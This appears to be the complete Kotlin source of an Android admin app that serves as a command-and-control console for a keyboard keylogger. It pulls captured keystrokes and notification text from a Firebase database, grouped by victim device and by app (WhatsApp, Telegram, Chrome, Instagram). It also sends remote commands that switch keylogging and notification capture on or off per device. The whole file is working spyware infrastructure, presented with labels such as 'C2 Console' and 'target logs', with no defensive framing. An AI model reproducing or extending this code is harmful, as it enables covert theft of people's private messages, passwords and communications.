package com.example.mykeyboardadmin

import android.graphics.Color
import android.os.Bundle
import android.text.method.ScrollingMovementMethod
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var txtTotalDevices: TextView
    private lateinit var txtTotalEvents: TextView
    private lateinit var txtGlobalLogConsole: TextView
    private lateinit var containerTopApps: LinearLayout

    private val deviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter
    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true,
        var logFeed: String = "Waiting for telemetry..."
    )

    data class LogEntry(
        val timestamp: Long,
        val appName: String,
        val text: String
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
        txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
        txtGlobalLogConsole = findViewById<TextView>(R.id.txtGlobalLogConsole)
        txtGlobalLogConsole.movementMethod = ScrollingMovementMethod()
        containerTopApps = findViewById<LinearLayout>(R.id.containerTopApps)

        val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
        btnRefresh.setOnClickListener {
            loadConnectedDevices()
            loadGlobalLogsAndAnalytics()
            Toast.makeText(this, "C2 Console optimized & synced!", Toast.LENGTH_SHORT).show()
        }

        recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(deviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
            if (type == "key") {
                device.keylogging = newState
                ref.child("keylogging").setValue(newState)
                ref.child("status").child("keylogging").setValue(newState)
            } else {
                device.notifications = newState
                ref.child("notifications").setValue(newState)
                ref.child("status").child("notifications").setValue(newState)
            }
            adapter.notifyDataSetChanged()
            Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
        }
        recyclerView.adapter = adapter

        loadConnectedDevices()
        loadGlobalLogsAndAnalytics()
    }

    private fun loadConnectedDevices() {
        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
        dbRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (deviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        deviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                    }
                }
                txtTotalDevices.text = deviceList.size.toString()
                adapter.notifyDataSetChanged()
            }

            override fun onCancelled(error: DatabaseError) {}
        })

        val batchRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
        batchRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (deviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        deviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                    }
                }
                txtTotalDevices.text = deviceList.size.toString()
                adapter.notifyDataSetChanged()
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
        
        cmdRef.child("keylogging").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
        }
        cmdRef.child("notifications").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
        }

        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val keyObj = snapshot.child("status").child("keylogging").value
                    ?: snapshot.child("keylogging").value
                val key = when (keyObj) {
                    is Boolean -> keyObj
                    is String -> keyObj.toBoolean()
                    else -> true
                }

                val notifObj = snapshot.child("status").child("notifications").value
                    ?: snapshot.child("notifications").value
                val notif = when (notifObj) {
                    is Boolean -> notifObj
                    is String -> notifObj.toBoolean()
                    else -> true
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].keylogging = key
                    deviceList[index].notifications = notif
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun getPrettyAppName(pkg: String): String {
        return when {
            pkg.contains("whatsapp", true) -> "🟢 WhatsApp"
            pkg.contains("chrome", true) -> "🌐 Chrome"
            pkg.contains("youtube", true) -> "🔴 YouTube"
            pkg.contains("instagram", true) -> "📸 Instagram"
            pkg.contains("dialer", true) -> "📞 Phone"
            pkg.contains("telegram", true) -> "✈️ Telegram"
            pkg.contains("settings", true) -> "⚙️ Settings"
            else -> "📱 ${pkg.substringAfterLast('.')}"
        }
    }

    private fun loadGlobalLogsAndAnalytics() {
        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val allEntries = mutableListOf<LogEntry>()
                val appCounts = mutableMapOf<String, Int>()
                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

                for (deviceChild in snapshot.children) {
                    val deviceName = deviceChild.key ?: "Device"
                    for (appChild in deviceChild.children) {
                        val rawApp = appChild.key ?: continue
                        val prettyApp = getPrettyAppName(rawApp)
                        for (entry in appChild.children) {
                            val text = entry.child("text").getValue(String::class.java)
                                ?: entry.child("title").getValue(String::class.java)
                                ?: entry.child("typedContent").getValue(String::class.java)
                                ?: continue

                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()

                            if (text.isNotBlank() && text != "null") {
                                allEntries.add(LogEntry(timestampMillis, "$deviceName: $prettyApp", text))
                                appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
                            }
                        }
                    }
                }

                // Sort latest activity on top and optimize for large data by capping to latest 300 entries
                allEntries.sortByDescending { it.timestamp }
                val limitedEntries = allEntries.take(300)

                txtTotalEvents.text = allEntries.size.toString()

                val sb = StringBuilder()
                for (item in limitedEntries) {
                    val timeStr = timeFormat.format(Date(item.timestamp))
                    sb.append("[$timeStr] ${item.appName}  |  ${item.text}\n")
                }
                txtGlobalLogConsole.text = if (sb.isNotEmpty()) sb.toString() else "No target logs recorded yet."

                updateTopAppsUI(appCounts, allEntries.size)
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceLogs(deviceName: String) {
        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val entries = mutableListOf<Triple<Long, String, String>>()
                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

                for (appChild in snapshot.children) {
                    val rawApp = appChild.key ?: continue
                    val prettyApp = getPrettyAppName(rawApp)
                    for (entry in appChild.children) {
                        val text = entry.child("text").getValue(String::class.java)
                            ?: entry.child("title").getValue(String::class.java)
                            ?: entry.child("typedContent").getValue(String::class.java)
                            ?: continue

                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()

                        if (text.isNotBlank() && text != "null") {
                            entries.add(Triple(timestampMillis, prettyApp, text))
                        }
                    }
                }

                // Sort newest on top and cap to 150 entries for high performance
                entries.sortByDescending { it.first }
                val limitedEntries = entries.take(150)

                val sb = StringBuilder()
                for (item in limitedEntries) {
                    val timeStr = timeFormat.format(Date(item.first))
                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun updateTopAppsUI(appCounts: Map<String, Int>, totalEvents: Int) {
        containerTopApps.removeAllViews()
        val sortedApps = appCounts.entries.sortedByDescending { it.value }.take(3)

        if (sortedApps.isEmpty()) {
            val emptyTv = TextView(this).apply {
                text = "No application data yet."
                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
                setTextColor(Color.parseColor("#666666"))
            }
            containerTopApps.addView(emptyTv)
            return
        }

        for ((appName, count) in sortedApps) {
            val percent = if (totalEvents > 0) (count * 100) / totalEvents else 0

            val itemLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(0, 8, 0, 8)
            }

            val labelRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
            }

            val nameTv = TextView(this).apply {
                text = appName
                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 13f)
                setTypeface(null, android.graphics.Typeface.BOLD)
                setTextColor(Color.parseColor("#1A1A1A"))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            }

            val countTv = TextView(this).apply {
                text = "$count ($percent%)"
                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
                setTextColor(Color.parseColor("#666666"))
            }

            labelRow.addView(nameTv)
            labelRow.addView(countTv)
            itemLayout.addView(labelRow)

            val barBg = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 8).apply { topMargin = 4 }
                setBackgroundColor(Color.parseColor("#E0E0E0"))
            }

            val barFill = View(this).apply {
                val weight = if (percent > 0) percent.toFloat() / 100f else 0.01f
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
                setBackgroundColor(Color.parseColor("#0277BD"))
            }

            val barEmpty = View(this).apply {
                val weight = if (percent < 100) (100 - percent).toFloat() / 100f else 0.01f
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
            }

            barBg.addView(barFill)
            barBg.addView(barEmpty)
            itemLayout.addView(barBg)

            containerTopApps.addView(itemLayout)
        }
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val txtName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
            val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
            val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
            val scrollView: View = view.findViewById<View>(R.id.logScrollView)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtName.text = "NODE // ${device.name}"

            if (device.keylogging) {
                holder.btnKey.text = "KEY_LOG: ON"
                holder.btnKey.setBackgroundColor(Color.parseColor("#238636"))
            } else {
                holder.btnKey.text = "KEY_LOG: OFF"
                holder.btnKey.setBackgroundColor(Color.parseColor("#DA3633"))
            }

            if (device.notifications) {
                holder.btnNotif.text = "NOTIF_LOG: ON"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#238636"))
            } else {
                holder.btnNotif.text = "NOTIF_LOG: OFF"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#DA3633"))
            }

            holder.txtLog.movementMethod = ScrollingMovementMethod()
            holder.scrollView.setOnTouchListener { v, event ->
                when (event.action) {
                    android.view.MotionEvent.ACTION_DOWN, android.view.MotionEvent.ACTION_MOVE -> {
                        v.parent.requestDisallowInterceptTouchEvent(true)
                    }
                    android.view.MotionEvent.ACTION_UP -> {
                        v.parent.requestDisallowInterceptTouchEvent(false)
                    }
                }
                false
            }
            holder.txtLog.text = device.logFeed

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        override fun getItemCount() = devices.size
    }
}
